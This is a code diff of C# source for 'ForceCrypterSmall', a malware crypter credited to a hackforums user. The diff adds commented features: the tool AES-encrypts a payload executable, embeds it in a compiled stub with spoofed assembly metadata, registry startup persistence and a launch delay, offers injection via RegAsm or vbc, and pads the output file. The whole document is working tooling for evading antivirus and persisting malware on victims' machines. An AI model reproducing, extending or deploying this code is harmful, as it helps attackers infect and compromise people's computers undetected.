@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.ComponentModel;
+using System.Configuration;
 using System.Data;
 using System.Diagnostics;
 using System.Drawing;
@@ -14,7 +15,10 @@ using System.Resources;
 using Microsoft.Win32;
 using ForceCrypterSmall.Resources;
 using System.Globalization;
-
+using System.Security.Cryptography;
+//Copyright 2016
+//Made by mrmutt for hackforums uid=3005497
+//Please leave this note here
 namespace ForceCrypterSmall
 {
     public partial class Form1 : Form
@@ -56,6 +60,7 @@ namespace ForceCrypterSmall
 
         public void Pump(string file, int amount, bool random)
         {
+            //Pumping function
             FileStream fs = new FileStream(file, FileMode.Append, FileAccess.Write);
             byte[] bytes = new byte[amount];
             if (random)
@@ -94,15 +99,11 @@ namespace ForceCrypterSmall
             }
         }
 
-        private void btnGen_Click_1(object sender, EventArgs e)
-        {
-            // Making a random encryption key with the RandomString we made before.
-            txtEncryptionKey.Text = RandomString(25);
-        }
 
         private void nsRandomPool1_ValueChanged(object sender)
         {
-            txtEncryptionKey.Text = nsRandomPool1.Value;
+            //Making a random key
+            txtEncryptionKey.Text = nsRandomPool1.Value + RandomString(15);
         }
 
         private void btnRandomize_Click_1(object sender, EventArgs e)
@@ -148,14 +149,18 @@ namespace ForceCrypterSmall
 
         private void btnCrypt_Click_1(object sender, EventArgs e)
         {
+            //Letting the user choose where to save the crypted file
             SaveFileDialog FSave = new SaveFileDialog()
             {
                 Filter = "Executable Files|*.exe",
                 InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
             };
+            //If he choose and everything is good
             if (FSave.ShowDialog() == DialogResult.OK)
             {
+                //Refrencing our stub
                 string boop = Properties.Resources.boop;
+                //Assembly information
                 boop = boop.Replace("[title-replace]", txtTitle.Text);
                 boop = boop.Replace("[company-replace]", txtCompany.Text);
                 boop = boop.Replace("[product-replace]", txtProduct.Text);
@@ -164,47 +169,73 @@ namespace ForceCrypterSmall
                 boop = boop.Replace("[desc-replace]", txtDescription.Text);
                 boop = boop.Replace("[version-replace]", txtVersion.Text);
                 boop = boop.Replace("[fversion-replace]", txtFVersion.Text);
+                //Checking if the user checked startup and if he did replace the bool in stub.
                 boop = boop.Replace("[startup-replace]", cbStartup.Checked ? "true" : "false");
-                if(cbStartup.Checked )
-                    boop = boop.Replace("[regkey-replace]", txtStartup.Text);
-                boop = boop.Replace("[key-replace]", txtEncryptionKey.Text);
-                byte[] fBytes = File.ReadAllBytes(txtPayload.Text);
-                byte[] encBytes = Encboop.PolyDexEncrypt(fBytes,txtEncryptionKey.Text);
-                boop = boop.Replace("[encmethod-replace]", "polydex");
+                //Another startup check
+                if (cbStartup.Checked)
+                {
+                    //RegisteryKey
+                    boop = boop.Replace("[regkey-replace]", txtRegKey.Text);
+                    //FolderName
+                    boop = boop.Replace("[fname-replace]", txtFName.Text);
+                    //FileName
+                    boop = boop.Replace("[finame-replace]", txtStartup.Text);
+                }
                 
+                //Replacing the key in the stub with our encryption key
+                boop = boop.Replace("[key-replace]", txtEncryptionKey.Text);
+                //Reading the bytes from our payload
+                byte[] fBytes = File.ReadAllBytes(txtPayload.Text);
+                //Crypting process
+                string fCrypted = Convert.ToBase64String(fBytes);
+                //Crypting process
+                byte[] first = Encoding.UTF8.GetBytes(fCrypted);
+                //Getting the bytes from the encryption key
+                byte[] enckey = Encoding.UTF8.GetBytes(txtEncryptionKey.Text);
+                //Making a hash for the key
+                enckey = SHA256.Create().ComputeHash(enckey);
+                //Encrypting the bytes of the payload
+                byte[] encBytes = Encboop.AESEncrypt(first, enckey);
+                //Injection methods               
                 if (rbItself.Checked)
                     boop = boop.Replace("[inject-replace]", "[itself]");
                 if(rbRegAsm.Checked)
                     boop = boop.Replace("[inject-replace]", "[regasm]");
                 if(rbVbc.Checked)
                     boop = boop.Replace("[inject-replace]", "[vbc]");
-                if (cbPersistence.Checked)
-                {
-                    
-                }
-
+                //Checking if user checked delay
                 if (cbDelay.Checked)
-                    {
-                        boop = boop.Replace("[delay-replace]", txtDelay.Text);
-                    }
+                {
+                    boop = boop.Replace("[delay-replace]", txtDelay.Text);
+                }
+                else
+                {
+                    boop = boop.Replace("[delay-replace]", "0");
+                }
 
                    
                     bool worked;
+                    //Our resource file
                     string ResF = Path.Combine(Application.StartupPath, "Encrypted.resources");
+                    //Using a resourcewriter on our resource file
                     using (var Writer = new ResourceWriter(ResF))
                     {
+                        //Adding the encrypted bytes to the resource file
                         Writer.AddResource("encfile", encBytes);
-                                           
+                        //Generating             
                         Writer.Generate();
                     }
-                    if (File.Exists(txtIcon.Text))
+                   //If there is a icon compile with icon
+                if (File.Exists(txtIcon.Text))
                         worked = Compiler.CompileFromSource(boop, FSave.FileName, txtIcon.Text, new string[] {ResF});
+                   //If not compile without
                     else
                         worked = Compiler.CompileFromSource(boop, FSave.FileName, null, new string[] {ResF});
 
-
+                    //If worked show a messagebox
                     if (worked)
                         MessageBox.Show("Forced!", "Succsess!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    //If user chose to pump we pump the output file
                     if (cbPump.Checked)
                     {
                         if (rbRandomBytes.Checked)
@@ -220,17 +251,5 @@ namespace ForceCrypterSmall
                 }
             }
 
-        private void btnBinder_Click(object sender, EventArgs e)
-        {
-            using (OpenFileDialog ofd = new OpenFileDialog())
-            {
-                if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
-                {
-                    ofd.Filter = "File To Bind|*.exe";
-                    txtBinder.Text = ofd.FileName;
-                }
-
-            }
-        }
     }
 }
